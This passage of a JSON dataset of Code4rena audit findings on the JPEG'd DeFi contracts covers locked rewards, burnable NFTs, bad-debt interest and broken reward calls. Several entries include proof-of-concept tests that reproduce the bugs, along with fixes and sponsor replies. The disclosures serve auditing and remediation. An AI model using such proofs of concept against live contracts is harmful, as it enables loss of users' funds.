[[3]](https://github.com/code-423n4/code423n4.com/blob/582de04e5765ee1953d0f07968fcd46ee2204ac7/_data/reports/2021-05-fairside.md#m-09-should-check-return-data-from-chainlink-aggregators)\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/54#issuecomment-1102902675):**\n > Fixed in [jpegd/core#9](https://github.com/jpegd/core/pull/9).\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/54#issuecomment-1109875877):**\n > Agree with sponsor on the medium risk rating. An oracle with a bad value is by definition an external requirement.\n\n\n\n***\n\n",
      "summary": "\nThis bug report focuses on a vulnerability in a code written in the Solidity programming language. The code is located at the given GitHub repository and the vulnerability is found at line 105. The vulnerability is that the Oracle data feed is not sufficiently validated, leading to a potential situation where the price can be stale and the wrong answer is returned. This can lead to incorrect calculations and results. The recommended mitigation steps are to validate the data feed, which can be done by adding code to the function at line 105 to check for stale price and round completeness.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/54",
      "tags": [],
      "finders": [
        "hickuphh3",
        "Jujic"
      ]
    },
    {
      "id": "1920",
      "title": "[M-05] Rewards will be locked if user transfer directly to pool without using deposit function ",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L190\n\n\n## Vulnerability details\n\n## Impact\n###### LpFarming.sol\nreward will be locked in the farming, when user execute a direct transfer with lpToken to farm without using deposit  \n\n## Proof of Concept\n\"pls add this test to LpFarming.ts to check\" \n\n```\nit(\"a part of rewards can't be distributed if user execute a direct transfer to farm\", async() => {\n      // manual mine new block  \n      await network.provider.send(\"evm_setAutomine\", [false]);\n\n      // prepare \n      const attacker = bob;\n      await lpTokens[0].transfer(alice.address, units(1000));\n      await lpTokens[0].transfer(attacker.address, units(1000));\n      await lpTokens[0].connect(alice).approve(farming.address, units(1000));\n      await mineBlocks(1);\n\n      // attacker direct deposit lp token to the pool \n      await lpTokens[0].connect(attacker).transfer(farming.address, units(100));\n\n      // create new pool\n      await farming.add(10, lpTokens[0].address);\n      await mineBlocks(1);\n      expect(await farming.poolLength()).to.equal(1);\n\n      let pool = await farming.poolInfo(0);\n      expect(pool.lpToken).to.equal(lpTokens[0].address);\n      expect(pool.allocPoint).to.equal(10);\n\n      // create new epoch ==> balance of pool will be 1000 \n      let blockNumber = await ethers.provider.getBlockNumber();\n      await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);\n\n      // alice deposit \n      await farming.connect(alice).deposit(0, units(100));\n      await mineBlocks(1);\n\n      expect(await jpeg.balanceOf(farming.address)).to.equal(1000);\n\n      // when pool end, alice can just take 500 jpeg, and 500 jpeg will be locked in the contract forever !!!\n      await mineBlocks(13);\n      console.log(\"reward of alice: \", (await   farming.pendingReward(0, alice.address)).toString());\n      expect(await farming.pendingReward(0, alice.address)).to.equal(BigNumber.from('500'));\n    });\n```\nIn the test above, the attacker transfers 100 lpToken to the farm without using deposit function, and alice deposit 100 lpToken. Because the contract uses ```pool.lpToken.balanceOf(address(this))``` to get the total supply of lpToken in the pool, it will sum up 100 lpToken of attacker and 100 lpToken of alice. This will lead to the situation where Alice will only be able to claim 500 token (at epoch.endBlock), the rest will be locked in the pool forever. Not only with this pool, it also affects the following, a part of the reward will be locked in the pool when the farm end.\n\n## Tools Used\ntypescript \n\n## Recommended Mitigation Steps\nDeclare a new variable ```totalLPSupply``` to the struct ```PoolInfo```, and use it instead of ```pool.lpToken.balanceOf(address(this))```",
      "summary": "\nThis bug report is about a vulnerability in the LPFarming.sol contract, which can cause a part of rewards to be locked in the farming when a user executes a direct transfer with lpToken to the farm without using the deposit function. The proof of concept provided in the report shows how this vulnerability can be exploited. The tools used in the report are typescript. The recommended mitigation step to fix this vulnerability is to declare a new variable ```totalLPSupply``` to the struct ```PoolInfo```, and use it instead of ```pool.lpToken.balanceOf(address(this))```.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/19",
      "tags": [],
      "finders": [
        "TrungOre"
      ]
    },
    {
      "id": "1919",
      "title": "[M-04] setDebtInterestApr should accrue debt first",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L212\n\n\n## Vulnerability details\n\n## Impact\nThe `setDebtInterestApr` changes the debt interest rate without first accruing the debt.\nThis means that the new debt interest rate is applied retroactively to the unaccrued period on next `accrue()` call.\n\nIt should never be applied retroactively to a previous time window as this is unfair & wrong.\nBorrowers can incur more debt than they should.\n\n## Recommended Mitigation Steps\nCall `accrue()` first in `setDebtInterestApr` before setting the new `settings.debtInterestApr`.",
      "summary": "\nThis bug report describes a vulnerability in the NFTVault.sol file in the code-423n4/2022-04-jpegd repository. This vulnerability allows the debt interest rate to be changed without first accruing the debt, meaning the new debt interest rate is applied retroactively to the unaccrued period on the next `accrue()` call. This can lead to borrowers incurring more debt than they should, which is unfair and wrong. The recommended mitigation step is to call `accrue()` first in `setDebtInterestApr` before setting the new `settings.debtInterestApr`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/78",
      "tags": [],
      "finders": [
        "cmichel",
        "pedroais"
      ]
    },
    {
      "id": "1918",
      "title": "[M-03] reward will be locked in the farm if no LP join the pool at epoch.startBlock ",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L214\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L107\n\n\n## Vulnerability details\n\n## Impact\na part of reward tokens will be locked in the farming pool if no user deposits lpToken at the epoch.startBlock\n\n## Proof of Concept\n```\nit(\"a part of reward should be locked in farm if no LP join the pool at epoch.startBlock\", async() => {\n      // manual mine new block  \n      await network.provider.send(\"evm_setAutomine\", [false]);\n\n      // prepare \n      await lpTokens[0].transfer(alice.address, units(1000));\n      await lpTokens[0].connect(alice).approve(farming.address, units(1000));\n      await mineBlocks(1);\n\n      // create new pool\n      await farming.add(10, lpTokens[0].address);\n      await mineBlocks(1);\n      expect(await farming.poolLength()).to.equal(1);\n\n      let pool = await farming.poolInfo(0);\n      expect(pool.lpToken).to.equal(lpTokens[0].address);\n      expect(pool.allocPoint).to.equal(10);\n\n      // create new epoch ==> balance of pool will be 1000 \n      let blockNumber = await ethers.provider.getBlockNumber();\n      await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);\n\n      // skip the epoch.startBlock  \n      // it mean no one deposit lpToken to farm at this block \n      await mineBlocks(1);\n      expect(await jpeg.balanceOf(farming.address)).to.equal(1000);\n\n      // alice deposit \n      await farming.connect(alice).deposit(0, units(100));\n      await mineBlocks(1);\n\n      // skip the blocks to the end of epoch \n      await mineBlocks(13);\n\n      await farming.connect(alice).claim(0);\n      await mineBlocks(1);\n\n      console.log(\"reward of alice: \", (await jpeg.balanceOf(alice.address)).toString());\n      console.log(\"reward remain: \", await jpeg.balanceOf(farming.address));\n\n      // 100 jpeg will be locked in the pool forevers \n      expect(await jpeg.balanceOf(alice.address)).to.equal(900);\n      expect(await jpeg.balanceOf(farming.address)).to.equal(100);\n    }); \n```    \nIn the example above, I create an epoch from blockNumber + 1 to blockNumber + 11 with the reward for each block being 100JPEG. So, the total reward for this farm will be 1000JPEG. When I skip the epoch.startBlock and let Alice deposit 100 lpToken at the block right after, at the end of the farm (epoch.endBlock), the total reward of Alice is just 900JPEG, and 100JPEG still remains in the farming pool. Since there is no function for the admin (or users) to withdraw the remaining, 100JPEG will be stucked in the pool forever !!!    \n## Tools Used\ntypescript \n\n\n## Recommended Mitigation Steps\nAdd a new function for the admin (or user) to claim all rewards which remained in the pool when epoch.endTime has passed\n```\nfunction claimRemainRewardsForOwner() external onlyOwner {\n        require(\n            block.number > epoch.endBlock, \n            'epoch has not ended'\n        );\n        uint256 remain = jpeg.balanceOf(address(this));\n        jpeg.safeTransfer(msg.sender, remain);\n    }\n```",
      "summary": "\nThis bug report is about a vulnerability in the LPFarming.sol contract, which is part of the code-423n4/2022-04-jpegd repository. The vulnerability is that a part of reward tokens will be locked in the farming pool if no user deposits lpToken at the epoch.startBlock. This is demonstrated in the proof of concept code, which shows that if Alice deposits 100 lpToken at the block right after the epoch.startBlock, at the end of the farm (epoch.endBlock), the total reward of Alice is just 900JPEG, and 100JPEG still remains in the farming pool. Since there is no function for the admin (or users) to withdraw the remaining, 100JPEG will be stucked in the pool forever.\n\nThe recommended mitigation step for this vulnerability is to add a new function for the admin (or user) to claim all rewards which remained in the pool when epoch.endTime has passed. The code for this new function is provided in the bug report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/14",
      "tags": [],
      "finders": [
        "TrungOre"
      ]
    },
    {
      "id": "1917",
      "title": "[M-02] NFTHelper Contract Allows Owner to Burn NFTs",
      "impact": "MEDIUM",
      "content": "_Submitted by Kenshin_\n\n[CryptoPunksHelper.sol#L38](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/CryptoPunksHelper.sol#L38)<br>\n[CryptoPunksHelper.sol#L52](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/CryptoPunksHelper.sol#L52)<br>\n\nIn the NFT helper contract, there is no validation on that the receiver address must not be address zero. Therefore, it allows owner or an attacker who gain access to the owner address to burn NFTs forever through the functions by transferring the NFTs to address zero.\n\n### Proof of Concept\n\nThe PoC is originally conducted using foundry. However, it isn't that complicated so I rewrote it in TypeScipt as well, the team can easily proof this by including in the `CryptoPunksHelper.ts`.\n\n#### TypeScript\n\n    // add `.only` to run only this test, not all.\n    it.only(\"allows the owner to burn nfts\", async () => {\n        // safeTransferFrom\n        await cryptoPunks.getPunk(1);\n        await cryptoPunks.transferPunk(helper.address, 1);\n        await helper.safeTransferFrom(owner.address, ZERO_ADDRESS, 1);\n        expect(await cryptoPunks.punkIndexToAddress(1)).to.equal(ZERO_ADDRESS);\n        expect(await helper.ownerOf(1)).to.equal(ZERO_ADDRESS);\n\n        // transferFrom\n        await cryptoPunks.getPunk(2);\n        await cryptoPunks.transferPunk(helper.address, 2);\n        await helper.transferFrom(owner.address, ZERO_ADDRESS, 2);\n        expect(await cryptoPunks.punkIndexToAddress(2)).to.equal(ZERO_ADDRESS);\n        expect(await helper.ownerOf(2)).to.equal(ZERO_ADDRESS);\n      });\n\n#### Foundry\n\n    pragma solidity ^0.8.0;\n\n    // for test\n    import \"ds-test/test.sol\";\n    import \"forge-std/Vm.sol\";\n\n    // contracts\n    import \"../test/CryptoPunks.sol\";\n    import \"../helpers/CryptoPunksHelper.sol\";\n\n    contract CryptoPunksHelperTest is DSTest {\n        Vm constant vm = Vm(HEVM_ADDRESS);\n        \n        address owner = address(1);\n        address user = address(2);\n        \n        CryptoPunks private cps;\n        CryptoPunksHelper private helper;\n\n        function setUp() public {\n            vm.startPrank(owner);\n            cps = new CryptoPunks();\n            helper = new CryptoPunksHelper();\n            helper.initialize(address(cps));\n            vm.stopPrank();\n        }\n\n        function testOwnerTransferToZero() public {\n            //make sure address zero hold no punks\n            assertEq(cps.balanceOf(address(0)), 0);\n\n            // safeTransferFrom PoC\n            vm.startPrank(owner);\n            cps.getPunk(1);\n            cps.transferPunk(address(helper), 1);\n            helper.safeTransferFrom(owner, address(0), 1);\n            assertEq(cps.punkIndexToAddress(1), address(0));\n            assertEq(helper.ownerOf(1), address(0));\n            assertEq(cps.balanceOf(address(0)), 1);\n\n            // transferFrom PoC\n            cps.getPunk(2);\n            cps.transferPunk(address(helper), 2);\n            helper.transferFrom(owner, address(0), 2);\n            assertEq(cps.punkIndexToAddress(2), address(0));\n            assertEq(helper.ownerOf(2), address(0));\n            assertEq(cps.balanceOf(address(0)), 2);\n        }\n    }\n\nfoundry.toml\n\n    [default]\n    src = \"contracts\"\n    libs = [\"lib/forge-std/lib\", \"lib/\", \"node_modules\"]\n    solc_version = \"0.8.0\"\n    optimizer = false\n    fuzz_runs = 100000\n    test = \"foundryTest\"\n\n### Tools Used\n\n*   Foundry\n*   Hardhat\n\n### Recommended Mitigation Steps\n\nEven the functions are restricted for only the owner, the zero address should not be allowed as the receiver address.\n\n**[spaghettieth (JPEG'd) acknowledged and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/47#issuecomment-1095518421):**\n > The sole purpose of `CryptoPunksHelper.sol` and `EtherRocksHelper.sol` contracts is to allow compatibility of non ERC721 NFTs to be compatible with `NFTVault.sol` without having to modify the vault's code. They don't have to provide any additional security check outside of compatibility related ones, everything else is out of scope and should be handled by the underlying NFT.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the NFT helper contract. The vulnerability allows the owner or an attacker who gains access to the owner address to burn NFTs forever through the functions by transferring the NFTs to address zero. This was proven using Foundry and Hardhat tools, and the code was rewritten in TypeScript. The recommended mitigation step is to make sure that the zero address is not allowed as the receiver address, even though the functions are restricted for only the owner.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/47",
      "tags": [],
      "finders": [
        "Kenshin"
      ]
    },
    {
      "id": "1916",
      "title": "[M-01] When _lpToken is jpeg, reward calculation is incorrect",
      "impact": "MEDIUM",
      "content": "_Submitted by cccz, also found by minhquanym_\n\nIn the LPFarming contract, a new staking pool can be added using the add() function. The staking token for the new pool is defined using the \\_lpToken variable. However, there is no additional checking whether the \\_lpToken is the same as the reward token (jpeg) or not.\n\n        function add(uint256 _allocPoint, IERC20 _lpToken) external onlyOwner {\n            _massUpdatePools();\n\n            uint256 lastRewardBlock = _blockNumber();\n            totalAllocPoint = totalAllocPoint + _allocPoint;\n            poolInfo.push(\n                PoolInfo({\n                    lpToken: _lpToken,\n                    allocPoint: _allocPoint,\n                    lastRewardBlock: lastRewardBlock,\n                    accRewardPerShare: 0\n                })\n            );\n        }\n\nWhen the \\_lpToken is the same token as jpeg, reward calculation for that pool in the updatePool() function can be incorrect. This is because the current balance of the \\_lpToken in the contract is used in the calculation of the reward. Since the \\_lpToken is the same token as the reward, the reward minted to the contract will inflate the value of lpSupply, causing the reward of that pool to be less than what it should be.\n\n        function _updatePool(uint256 _pid) internal {\n            PoolInfo storage pool = poolInfo[_pid];\n            if (pool.allocPoint == 0) {\n                return;\n            }\n\n            uint256 blockNumber = _blockNumber();\n            //normalizing the pool's `lastRewardBlock` ensures that no rewards are distributed by staking outside of an epoch\n            uint256 lastRewardBlock = _normalizeBlockNumber(pool.lastRewardBlock);\n            if (blockNumber <= lastRewardBlock) {\n                return;\n            }\n            uint256 lpSupply = pool.lpToken.balanceOf(address(this));\n            if (lpSupply == 0) {\n                pool.lastRewardBlock = blockNumber;\n                return;\n            }\n            uint256 reward = ((blockNumber - lastRewardBlock) *\n                epoch.rewardPerBlock *\n                1e36 *\n                pool.allocPoint) / totalAllocPoint;\n            pool.accRewardPerShare = pool.accRewardPerShare + reward / lpSupply;\n            pool.lastRewardBlock = blockNumber;\n        }\n\n### Proof of Concept\n\n[LPFarming.sol#L141-L154](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L141-L154)<br>\n[LPFarming.sol#L288-L311](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L288-L311)<br>\n\n### Recommended Mitigation Steps\n\nAdd a check that \\_lpToken is not jpeg in the add function or mint the reward token to another contract to prevent the amount of the staked token from being mixed up with the reward token.\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/1)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/1#issuecomment-1099231224):**\n > Fixed in [jpegd/core#2](https://github.com/jpegd/core/pull/2).\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the LPFarming contract of the 2022-04-jpegd repository on GitHub. This bug has the potential to cause an incorrect reward calculation for a new pool added to the contract. The add() function in the contract allows a new staking pool to be added, and the staking token for the pool is defined using the _lpToken variable. However, no additional checking is done to ensure that the _lpToken is the same as the reward token (jpeg). If the _lpToken is the same token as the reward, the reward minted to the contract will inflate the value of lpSupply, causing the reward of that pool to be less than what it should be. \n\nTo mitigate this issue, a check should be added to the add() function to ensure that the _lpToken is not the same as the reward token. Alternatively, the reward token can be minted to a different contract to prevent the amount of the staked token from being mixed up with the reward token.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/1",
      "tags": [],
      "finders": [
        "cccz",
        "minhquanym"
      ]
    },
    {
      "id": "1915",
      "title": "[H-09] Bad debts should not continue to accrue interest",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\n[NFTVault.sol#L844-L851](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L844-L851)<br>\n\n```solidity\nuint256 debtAmount = _getDebtAmount(_nftIndex);\nrequire(\n    debtAmount >= _getLiquidationLimit(_nftIndex),\n    \"position_not_liquidatable\"\n);\n\n// burn all payment\nstablecoin.burnFrom(msg.sender, debtAmount);\n```\n\nIn the current design/implementation, the liquidator must fully repay the user's outstanding debt in order to get the NFT.\n\nWhen the market value of the NFT fell rapidly, the liquidators may not be able to successfully liquidate as they can not sell the NFT for more than the debt amount.\n\nIn that case, the protocol will have positions that are considered bad debts.\n\nHowever, these loans, which may never be repaid, are still accruing interest. And every time the DAO collects interest, new `stablecoin` will be minted.\n\nWhen the proportion of bad debts is large enough since the interest generated by these bad debts is not backed. It will damage the authenticity of the stablecoin.\n\n### Proof of Concept\n\nGiven:\n\n*   `NFT 1` worth 30,000 USD\n*   `creditLimitRate` = 60%\n*   `liquidationLimitRate` = 50%\n*   `debtInterestApr` = 10%\n\n1.  Alice borrowed `10,000 USD` with `NFT #1`;\n2.  After 1 year, `NFT 1`'s market value in USD has suddenly dropped to `10,000` USD, no liquidator is willing to repay 11,000 USD for `NFT #1`;\n3.  The DAO `collect()` and minted `1,000` stablecoin;\n4.  After 1 year, the DAO call `collect()` will mint `1,100` stablecoin. and so on...\n\n### Recommended Mitigation Steps\n\nConsider adding a stored value to record the amount of bad debt, and add a public function that allows anyone to mark a bad debt to get some reward. and change `accrue` to:\n\n```solidity\nuint256 internal badDebtPortion;\n\nfunction accrue() public {\n    uint256 additionalInterest = _calculateAdditionalInterest();\n\n    totalDebtAccruedAt = block.timestamp;\n\n    totalDebtAmount += additionalInterest;\n\n    uint256 collectibleInterest = additionalInterest * (totalDebtPortion - badDebtPortion) / totalDebtPortion;\n    totalFeeCollected += collectibleInterest;\n}\n```\n\n**[spaghettieth (JPEG'd) acknowledged, but disagreed with High severity](https://github.com/code-423n4/2022-04-jpegd-findings/issues/167)**\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/167#issuecomment-1109933407):**\n > I agree with the warden. Left unchecked, this issue is almost certain to occur and will cause substantial negative impacts on the protocol. The only way this would not occur is if the NFT market never crashes.\n\n\n\n***\n \n",
      "summary": "\nThis bug report concerns a vulnerability in the NFTVault contract of the 2022-04-jpegd code repository. The vulnerability involves the liquidation process of a user's outstanding debt. Currently, the liquidator must fully repay the user's debt in order to get the NFT. This can become a problem when the market value of the NFT falls rapidly, as the liquidator may not be able to sell the NFT for more than the debt amount. This will result in bad debt positions that are not backed and will damage the authenticity of the stablecoin. \n\nTo demonstrate the vulnerability, a PoC was provided. It involved an NFT worth 30,000 USD, a credit limit rate of 60%, a liquidation limit rate of 50%, and a debt interest APR of 10%. An example was given of Alice borrowing 10,000 USD with NFT #1, and after one year, the NFT's market value in USD suddenly dropped to 10,000 USD. In this case, no liquidator is willing to repay 11,000 USD for NFT #1, and every time the DAO collects interest, new stablecoin will be minted.\n\nThe recommendation given was to consider adding a stored value to record the amount of bad debt, and add a public function that allows anyone to mark a bad debt to get some reward. The accrue function should also be changed to calculate the collectible interest based on the total debt portion minus the bad debt portion.\n\nIn conclusion, this bug report details a vulnerability in the NFTVault contract of the 2022-04-jpegd code repository. The vulnerability involves the liquidation process of a user's outstanding debt, which can result in bad debt positions that are not backed and will damage the authenticity of the stablecoin. A PoC and recommendation were provided to help mitigate the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/167",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1914",
      "title": "[H-08] StrategyPUSDConvex.balanceOfJPEG uses incorrect function signature while calling extraReward.earned, causing the function to unexpectedly revert everytime",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L234\n\n\n## Vulnerability details\n\n## Impact\n\nAs specified in Convex [BaseRewardPool.sol](https://github.com/convex-eth/platform/blob/main/contracts/contracts/BaseRewardPool.sol#L149) and [VirtualRewardPool.sol](https://github.com/convex-eth/platform/blob/main/contracts/contracts/VirtualBalanceRewardPool.sol#L127), the function signature of `earned` is `earned(address)`. However, `balanceOfJPEG` did not pass any arguments to `earned`, which would cause `balanceOfJPEG` to always revert.\n\nThis bug will propagate through `Controller` and `YVault` until finally reaching the source of the call in `YVaultLPFarming ._computeUpdate`, and render the entire farming contract unuseable.\n\n## Proof of Concept\n\nBoth `BaseRewardPool.earned` and `VirtualBalanceRewardPool.earned` takes an address as argument\n\n```\n    function earned(address account) public view returns (uint256) {\n        return\n            balanceOf(account)\n                .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))\n                .div(1e18)\n                .add(rewards[account]);\n    }\n\n    function earned(address account) public view returns (uint256) {\n        return\n            balanceOf(account)\n                .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))\n                .div(1e18)\n                .add(rewards[account]);\n    }\n```\n\nBut `balanceOfJPEG` does not pass any address to `extraReward.earned`, causing the entire function to revert when called\n```\n    function balanceOfJPEG() external view returns (uint256) {\n        uint256 availableBalance = jpeg.balanceOf(address(this));\n\n        IBaseRewardPool baseRewardPool = convexConfig.baseRewardPool;\n        uint256 length = baseRewardPool.extraRewardsLength();\n        for (uint256 i = 0; i < length; i++) {\n            IBaseRewardPool extraReward = IBaseRewardPool(baseRewardPool.extraRewards(i));\n            if (address(jpeg) == extraReward.rewardToken()) {\n                availableBalance += extraReward.earned();\n                //we found jpeg, no need to continue the loop\n                break;\n            }\n        }\n\n        return availableBalance;\n    }\n```\n\n## Tools Used\n\nvim, ganache-cli\n\n## Recommended Mitigation Steps\n\nPass `address(this)` as argument of `earned`.\n\nNotice how we modify the fetching of reward. This is reported in a separate bug report, but for completeness, the entire fix is shown in both report entries.\n\n```\n    function balanceOfJPEG() external view returns (uint256) {\n        uint256 availableBalance = jpeg.balanceOf(address(this));\n\n        IBaseRewardPool baseRewardPool = convexConfig.baseRewardPool;\n        availableBalance += baseRewardPool.earned(address(this));\n        uint256 length = baseRewardPool.extraRewardsLength();\n        for (uint256 i = 0; i < length; i++) {\n            IBaseRewardPool extraReward = IBaseRewardPool(baseRewardPool.extraRewards(i));\n            if (address(jpeg) == extraReward.rewardToken()) {\n                availableBalance += extraReward.earned(address(this));\n            }\n        }\n\n        return availableBalance;\n    }\n```",
      "summary": "\nThis bug report is about a vulnerability in the code of a contract called “StrategyPUSDConvex”. It is located at https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L234. The bug is caused by a function called “balanceOfJPEG” not passing any arguments to the function “earned”, which is specified in two other contracts, “BaseRewardPool” and “VirtualRewardPool”. This would cause the entire farming contract to be unusable. The tools used to identify this bug were Vim and Ganache-cli. The recommended mitigation step is to pass “address(this)” as an argument of “earned”. This fix is shown in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/139",
      "tags": [],
      "finders": [
        "rayn"
      ]
    },
    {
      "id": "1913",
      "title": "[H-07] Controller: Strategy migration will fail",
      "impact": "HIGH",
      "content": "_Submitted by hickuphh3, also found by rayn_\n\n[Controller.sol#L95](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/Controller.sol#L95)<br>\n[StrategyPUSDConvex.sol#L266](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L266)<br>\n\nThe controller calls the `withdraw()` method to withdraw JPEGs from the contract, but the strategy might blacklist the JPEG asset, which is what the PUSDConvex strategy has done.\n\nThe migration would therefore revert.\n\n### Proof of Concept\n\nInsert this test into [`StrategyPUSDConvex.ts`](https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/StrategyPUSDConvex.ts).\n\n```jsx\nit.only(\"will revert when attempting to migrate strategy\", async () => {\n  await controller.setVault(want.address, yVault.address);\n  await expect(controller.setStrategy(want.address, strategy.address)).to.be.revertedWith(\"jpeg\");\n});\n```\n\n### Recommended Mitigation Steps\n\nReplace `_current.withdraw(address(jpeg));` with `_current.withdrawJPEG(vaults[_token])`.\n\n**[spaghettieth (JPEG'd) confirmed and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/57#issuecomment-1096633358):**\n > The proposed migration steps would modify the intended behaviour, which is to withdraw JPEG to the controller and not the vault. A correct solution would be replacing `_current.withdraw(address(jpeg))` with `_current.withdrawJPEG(address(this))`.\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/57#issuecomment-1099242526):**\n > Fixed in [jpegd/core#6](https://github.com/jpegd/core/pull/6).\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the contracts of the code-423n4/2022-04-jpegd repository. Specifically, the controller calls the `withdraw()` method to withdraw JPEGs from the contract, but the strategy might blacklist the JPEG asset, which is what the PUSDConvex strategy has done. This would cause the migration to revert. In order to prove the concept, the tester inserted a test into the StrategyPUSDConvex.ts file, which demonstrated the issue. The recommended mitigation step is to replace `_current.withdraw(address(jpeg));` with `_current.withdrawJPEG(vaults[_token])`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/57",
      "tags": [],
      "finders": [
        "rayn",
        "hickuphh3"
      ]
    },
    {
      "id": "1912",
      "title": "[H-06] Setting new controller can break YVaultLPFarming",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L170\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L108\n\n\n## Vulnerability details\n\n## Impact\nThe accruals in `yVaultLPFarming` will fail if [`currentBalance < previousBalance`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L170) in `_computeUpdate`.\n\n```solidity\ncurrentBalance = vault.balanceOfJPEG() + jpeg.balanceOf(address(this));\nuint256 newRewards = currentBalance - previousBalance;\n```\n\nNo funds can be withdrawn anymore as the `withdraw` functions first trigger an `_update`.\n\nThe `currentBalance < previousBalance` case can, for example, be triggerd by decreasing the `vault.balanceOfJPEG()` due to calling `yVault.setController`:\n\n```solidity\nfunction setController(address _controller) public onlyOwner {\n    // @audit can reduce balanceofJpeg which breaks other masterchef contract\n    require(_controller != address(0), \"INVALID_CONTROLLER\");\n    controller = IController(_controller);\n}\n\nfunction balanceOfJPEG() external view returns (uint256) {\n    // @audit new controller could return a smaller balance\n    return controller.balanceOfJPEG(address(token));\n}\n```\n\n## Recommended Mitigation Steps\nSetting a new controller on a vault must be done very carefully and requires a migration.",
